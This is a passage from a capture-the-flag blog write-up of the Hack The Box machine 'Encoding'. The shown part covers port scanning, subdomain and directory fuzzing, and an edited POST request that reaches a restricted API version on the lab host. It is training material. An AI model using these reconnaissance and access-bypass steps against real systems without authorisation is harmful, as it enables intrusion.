<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  
    
    
    

    
      <!-- it's a local file path -->

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Hack The Box - Encoding" />
<meta property="og:locale" content="en" />
<meta name="description" content="This was a really fun box. I had to exploit two LFI vulnerabilities and PHP filters to get a foothold. Then exploit git configuration and systemd to escalate my privileges." />
<meta property="og:description" content="This was a really fun box. I had to exploit two LFI vulnerabilities and PHP filters to get a foothold. Then exploit git configuration and systemd to escalate my privileges." />
<link rel="canonical" href="http://localhost:4000/2023/04/HTB/Encoding" />
<meta property="og:url" content="http://localhost:4000/2023/04/HTB/Encoding" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:image" content="http://localhost:4000/assets/images/Encoding/Encoding.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-04-15T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/images/Encoding/Encoding.png" />
<meta property="twitter:title" content="Hack The Box - Encoding" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-04-15T00:00:00+08:00","datePublished":"2023-04-15T00:00:00+08:00","description":"This was a really fun box. I had to exploit two LFI vulnerabilities and PHP filters to get a foothold. Then exploit git configuration and systemd to escalate my privileges.","headline":"Hack The Box - Encoding","image":"http://localhost:4000/assets/images/Encoding/Encoding.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/04/HTB/Encoding"},"url":"http://localhost:4000/2023/04/HTB/Encoding"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hack The Box - Encoding | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">ğ„ğ­ğ¡ğ¢ğœğšğ¥ ğ‡ğšğœğ¤ğğ« || ğ’ğ¨ğŸğ­ğ°ğšğ«ğ ğ„ğ§ğ ğ¢ğ§ğğğ« || ğ‚ğ²ğ›ğğ« ğ’ğğœğ®ğ«ğ¢ğ­ğ² ğ‘ğğ¬ğšğ«ğœğ¡ğğ«.!! ğğ’ğ‚ğ & ğğ’ğ„ğ.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

      

        

      

        

          
            <span>Hack The Box - Encoding</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>Hack The Box - Encoding</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1681488000"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Apr 15, 2023
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="/assets/images/Encoding/Encoding.png" class="preview-img bg"
        alt="Preview Image"

      

       data-proofer-ignore>

      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="3938 words">
  <em>21 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>This was a really fun box. I had to exploit two LFI vulnerabilities and PHP filters to get a foothold. Then exploit git configuration and systemd to escalate my privileges.</p>

<ul>
  <li>Room: Encoding</li>
  <li>Difficulty: Medium</li>
  <li>URL: <a href="https://app.hackthebox.com/machines/Encoding">https://app.hackthebox.com/machines/Encoding</a></li>
  <li>Author: <a href="https://app.hackthebox.com/users/389926">kavigihan</a></li>
</ul>

<h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I started by scanning for open ports.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>rustscan <span class="nt">-a</span> target <span class="nt">--</span> <span class="nt">-A</span> | <span class="nb">tee </span>rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan'</span>s speed. Use the Docker image, or up the Ulimit with <span class="s1">'--ulimit 5000'</span><span class="nb">.</span>
Open 10.10.11.198:22
Open 10.10.11.198:80
<span class="o">[</span>~] Starting Script<span class="o">(</span>s<span class="o">)</span>
<span class="o">[&gt;]</span> Script to be run Some<span class="o">(</span><span class="s2">"nmap -vvv -p  "</span><span class="o">)</span>

<span class="o">[</span>~] Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-04 08:26 EST

...

Scanned at 2023-03-04 08:26:12 EST <span class="k">for </span>7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk<span class="o">=</span>
|   256 816e78766b8aea7d1babd436b7f8ecc4 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: HaxTables
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 08:26
Completed NSE at 08:26, 0.00s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 08:26
Completed NSE at 08:26, 0.00s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 08:26
Completed NSE at 08:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>7.92 seconds
</pre></td></tr></tbody></table></code></div></div>

<p>Port 22 (SSH) and 80 (HTTP) were open. I also checked for UDP ports.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> target <span class="nt">-oN</span> nmapUdp.txt
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>ehogue:
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-04 08:26 EST
Nmap scan report <span class="k">for </span>target <span class="o">(</span>10.10.11.198<span class="o">)</span>
Host is up <span class="o">(</span>0.049s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 999 closed udp ports <span class="o">(</span>port-unreach<span class="o">)</span>
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1019.01 seconds
</pre></td></tr></tbody></table></code></div></div>

<p>Only DHCP was open.</p>

<p>I did not see any redirects, but when I looked at the site, I saw that there was an API at â€˜api.haxtables.htbâ€™. I added â€˜haxtables.htbâ€™ and â€˜api.haxtables.htbâ€™ to my hosts file and scanned for other subdomains.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/amass/wordlists/subdomains-top1mil-5000.txt <span class="nt">-t30</span> <span class="nt">--hw</span> 137 <span class="nt">-H</span> <span class="s2">"Host:FUZZ.haxtables.htb"</span> <span class="s2">"http://haxtables.htb"</span>

<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://haxtables.htb/
Total requests: 5000

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload
<span class="o">=====================================================================</span>

000000051:   200        0 L      0 W        0 Ch        <span class="s2">"api"</span>
000000177:   403        9 L      28 W       284 Ch      <span class="s2">"image"</span>
000002700:   400        10 L     35 W       305 Ch      <span class="s2">"m."</span>
000002795:   400        10 L     35 W       305 Ch      <span class="s2">"ns2.cl.bellsouth.net."</span>
000002883:   400        10 L     35 W       305 Ch      <span class="s2">"ns1.viviotech.net."</span>
000002885:   400        10 L     35 W       305 Ch      <span class="s2">"ns2.viviotech.net."</span>
000003050:   400        10 L     35 W       305 Ch      <span class="s2">"ns3.cl.bellsouth.net."</span>
000004083:   400        10 L     35 W       305 Ch      <span class="s2">"quatro.oweb.com."</span>
000004082:   400        10 L     35 W       305 Ch      <span class="s2">"jordan.fortwayne.com."</span>
000004081:   400        10 L     35 W       305 Ch      <span class="s2">"ferrari.fortwayne.com."</span>

Total <span class="nb">time</span>: 0
Processed Requests: 4973
Filtered Requests: 4963
Requests/sec.: 0
</pre></td></tr></tbody></table></code></div></div>

<p>It found â€˜image.haxtables.htbâ€™, I added it with the other domains.</p>

<h2 id="main-website"><span class="mr-2">Main Website</span><a href="#main-website" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I loaded the main website in a browser.</p>

<p><img data-src="/assets/images/Encoding/WebSite.png" alt="Main Site" title="Main Site" data-proofer-ignore></p>

<p>The site allowed performing some transformations on strings and integers. There was also a section for images, but it was â€˜Coming soonâ€™.</p>

<p>The Encoding menu took us to the pages to modify strings or integers. The URLs of those pages were interesting: â€˜http://haxtables.htb/index.php?page=stringâ€™. They had a â€˜pageâ€™ parameter that looked like it could be vulnerable to Local File Inclusion (LFI). I tried a few things, but nothing worked. The code was validating the value passed in.</p>

<h2 id="api"><span class="mr-2">API</span><a href="#api" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>The API menu took me to the API documentation with some examples on how to use it. And a hint about the API supporting more features not exposed in the UI.</p>

<p><img data-src="/assets/images/Encoding/API.png" alt="API" title="API" data-proofer-ignore></p>

<blockquote>
  <p>You can use our live API to make these convertions easier. There are some additional features which the API supports that our application doesnâ€™t. This application itself uses the API internally as the backbone.</p>
</blockquote>

<p>I scanned the API for hidden endpoints.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://api.haxtables.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-o</span> feroxApi.txt <span class="nt">-x</span> php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher ğŸ¤“                 ver: 2.7.3
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://api.haxtables.htb
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 ğŸ‘Œ  Status Codes          â”‚ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 ğŸ’¥  Timeout <span class="o">(</span>secs<span class="o">)</span>        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.7.3
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ’¾  Output File           â”‚ feroxApi.txt
 ğŸ’²  Extensions            â”‚ <span class="o">[</span>php]
 ğŸ  HTTP methods          â”‚ <span class="o">[</span>GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
 ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press <span class="o">[</span>ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
200      GET        0l        0w        0c http://api.haxtables.htb/
403      GET        9l       28w      282c http://api.haxtables.htb/.php
403      GET        9l       28w      282c http://api.haxtables.htb/.html
403      GET        9l       28w      282c http://api.haxtables.htb/.htm
403      GET        9l       28w      282c http://api.haxtables.htb/.html.php
200      GET        0l        0w        0c http://api.haxtables.htb/index.php
403      GET        9l       28w      282c http://api.haxtables.htb/.htm.php
403      GET        9l       28w      282c http://api.haxtables.htb/.htaccess
403      GET        9l       28w      282c http://api.haxtables.htb/.htaccess.php
200      GET        0l        0w        0c http://api.haxtables.htb/utils.php
301      GET        9l       28w      319c http://api.haxtables.htb/v2 <span class="o">=&gt;</span> http://api.haxtables.htb/v2/
403      GET        9l       28w      282c http://api.haxtables.htb/.phtml
301      GET        9l       28w      319c http://api.haxtables.htb/v1 <span class="o">=&gt;</span> http://api.haxtables.htb/v1/
301      GET        9l       28w      319c http://api.haxtables.htb/v3 <span class="o">=&gt;</span> http://api.haxtables.htb/v3/
403      GET        9l       28w      282c http://api.haxtables.htb/.htc

...

403      GET        9l       28w      282c http://api.haxtables.htb/.html_files.php
403      GET        9l       28w      282c http://api.haxtables.htb/.htmlpar.php
403      GET        9l       28w      282c http://api.haxtables.htb/.htmlprint.php
403      GET        9l       28w      282c http://api.haxtables.htb/.hts.php
<span class="o">[</span><span class="c">####################] - 1m    504704/504704  0s      found:91      errors:0</span>
<span class="o">[</span><span class="c">####################] - 1m    126176/126176  1473/s  http://api.haxtables.htb/</span>
<span class="o">[</span><span class="c">####################] - 0s    126176/126176  0/s     http://api.haxtables.htb/v2/ =&gt; Directory listing (add -e to scan)</span>
<span class="o">[</span><span class="c">####################] - 0s    126176/126176  0/s     http://api.haxtables.htb/v1/ =&gt; Directory listing (add -e to scan)</span>
<span class="o">[</span><span class="c">####################] - 0s    126176/126176  0/s     http://api.haxtables.htb/v3/ =&gt; Directory listing (add -e to scan)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>There were 3 versions of the API, and they had directory listing available. V1 and V3 of the API had two endpoints.</p>

<p><img data-src="/assets/images/Encoding/DirectoryListing.png" alt="Directory Listing" title="Directory Listing" data-proofer-ignore></p>

<p>V2 was blocked, apparently it had security issues.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"This resource is under construction and unavailable for public access due to security issues.!"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I could not load it directly, but I quickly found out that I could get to it by modifying the POST request that the UI sent when I used the encoding functions. The UI was using v3, I just changed it to v2.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/handler.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">haxtables.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=UTF-8</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://haxtables.htb</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://haxtables.htb/index.php?page=string</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">69</span>

<span class="p">{</span><span class="nl">"action"</span><span class="p">:</span><span class="s2">"hex2str"</span><span class="p">,</span><span class="nl">"data"</span><span class="p">:</span><span class="s2">"aaaaaaaaa"</span><span class="p">,</span><span class="nl">"uri_path"</span><span class="p">:</span><span class="s2">"/v2/tools/string"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<div class="language-http highlighter-rouge"><div class="code-header">
